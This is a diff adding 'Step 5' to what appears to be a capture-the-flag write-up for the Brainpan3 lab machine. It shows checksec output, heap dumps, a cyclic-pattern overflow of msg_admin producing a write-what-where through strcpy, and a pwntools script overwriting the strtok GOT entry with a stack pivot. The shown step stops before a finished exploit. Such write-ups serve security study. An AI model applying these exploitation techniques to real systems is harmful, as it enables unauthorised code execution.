@@ -768,5 +768,160 @@ sleep(1)
 r.interactive()
 ```
 
+## Step 5
+
+```
+ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec msg_admin 
+[*] '/home/ctf/ctfs/brainpan3/files/msg_admin'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE
+```
+
+ASLR is on:
+```
+$ cat /proc/sys/kernel/randomize_va_space
+2
+```
+
+```python
+# make-pwnmsg.py
+from pwn import *
+
+with open('pwn.msg', 'w') as f:
+    f.write('{}|{}\n'.format('a'*4, 'A'*10))
+    f.write('{}|{}\n'.format('b'*4, 'B'*10))
+    f.write('{}|{}\n'.format('b'*4, 'C'*10))
+
+```
+
+```
+ctf@ctf-barberpole:~/ctfs/brainpan3/files$ cat pwn.msg
+aaaa|AAAAAAAAAAAA
+bbbb|BBBBBBBBBBBB
+bbbb|CCCCCCCCCCCC
+```
+
+```
+gdb ./msg_admin
+r 1 pwn.msg
+```
+
+
+```
+# hexdump 0x804c390 120
+
++0000 0x804c390  a8 c3 04 08  11 00 00 00  61 61 61 61  00 00 00 00  |....|....|aaaa|....|
++0010 0x804c3a0  00 00 00 00  d1 00 00 00  41 41 41 41  41 41 41 41  |....|....|AAAA|AAAA|
++0020 0x804c3b0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |AA..|....|....|....|
++0030 0x804c3c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |....|....|....|....|
+*
++00e0 0x804c470  00 00 00 00  11 00 00 00  01 00 00 00  88 c4 04 08  |....|....|....|....|
++00f0 0x804c480  98 c4 04 08  11 00 00 00  62 62 62 62  00 00 00 00  |....|....|bbbb|....|
++0100 0x804c490  00 00 00 00  d1 00 00 00  42 42 42 42  42 42 42 42  |....|....|BBBB|BBBB|
++0110 0x804c4a0  42 42 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |BB..|....|....|....|
+```
+
+```
+>>> 0x804c480 - 0x804c3a8
+216
+```
+
+Suspicion that we can overflow the two pointers with `A`s
+```python
+# make-pwnmsg.py
+from pwn import *
+
+with open('pwn.msg', 'w') as f:
+    f.write('{}|{}\n'.format('a'*4, cyclic(216)))
+    f.write('{}|{}\n'.format('b'*4, 'B'*10))
+    f.write('{}|{}\n'.format('b'*4, 'C'*10))
+
+```
+
+```
+[-------------------------------------REGISTERS-------------------------------------]
+*EAX  0x62626262 ('bbbb')
+*EBX  0x804c170 <-- 'bbbb'
+*ECX  0x804c170 <-- 'bbbb'
+*EDX  0x63616164 ('daac')
+*EDI  0x0
+*ESI  0xffffc9d0 <-- 1
+*EBP  0xffffca68 <-- 0
+*ESP  0xffffc83c --> 0x8048cd0 (main+539) <-- mov    eax, dword ptr [ebp - 0x4c]
+*EIP  0xf7e95d82 <-- mov    dword ptr [edx], eax
+[---------------------------------------CODE----------------------------------------]
+ => 0xf7e95d82    mov    dword ptr [edx], eax
+[-------------------------------------BACKTRACE-------------------------------------]
+>  f 0 f7e95d82
+   f 1  8048cd0 main+539
+   f 2 f7e23a83 __libc_start_main+243
+   f 3  8048741 _start+33
+Program received signal SIGSEGV
+```
+
+Boom! Looks like we are overwriting the data in address `daac` (from our cyclic function) with `bbbb` (our second message). This is effectively a write-what-where condition.
+
+Looking at 0x804cd0, we see that we are in a strcpy. Set breakpoint there and restart:
+
+```
+[---------------------------------------CODE----------------------------------------]
+=> 0x8048ccb <main+534>    call   0x8048630 <strcpy@plt>
+    dest:      0x63616164 ('daac')
+    src:       0x804c170 <-- 'bbbb'
+```
+
+At the point of crash, our stack is in the following state:
+
+```
+[---------------------------------------STACK---------------------------------------]
+00:0000| esp  0xffffc83c --> 0x8048cd0 (main+539) <-- mov    eax, dword ptr [ebp - 0x4c]
+01:0004|      0xffffc840 <-- 0x63616164
+02:0008|      0xffffc844 --> 0x804c170 <-- 'bbbb'
+03:000c|      0xffffc848 --> 0x804c008 <-- 0xfbad2488
+04:0010|      0xffffc84c <-- 'aaaabaaacaaadaa...'
+05:0014|      0xffffc850 <-- 'baaacaaadaaaeaa...'
+06:0018|      0xffffc854 <-- 'caaadaaaeaaafaa...'
+07:001c|      0xffffc858 <-- 'daaaeaaafaaagaa...'
+```
+
+Set `bbbb` to the address of `stack move 20 from binjitsu` and set the offset of `daac` to the `strtok` GOT entry.
+
+```
+from pwn import *
+
+elf = ELF('msg_admin')
+rop = ROP(elf)
+
+pivot = rop.search(move=20).address # Need to move the stack 20 bytes to get to our ROP chain
+strtok = elf.got['strtok']
+
+log.info("Pivot: {}".format(hex(pivot)))
+log.info("Strtok: {}".format(hex(strtok)))
+
+# Overwrite `strtok` in GOT with the stack pivot
+with open('pwn.msg', 'w') as f:
+    sc = 'A' * cyclic_find('daac') + p32(strtok)
+    sc += 'B' * (216 - len(sc))
+    f.write('{}|{}\n'.format('a'*4, sc))
+    f.write('{}|{}\n'.format(p32(pivot), 'B'*12))
+    f.write('{}|{}\n'.format('b'*4, 'C'*12))
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
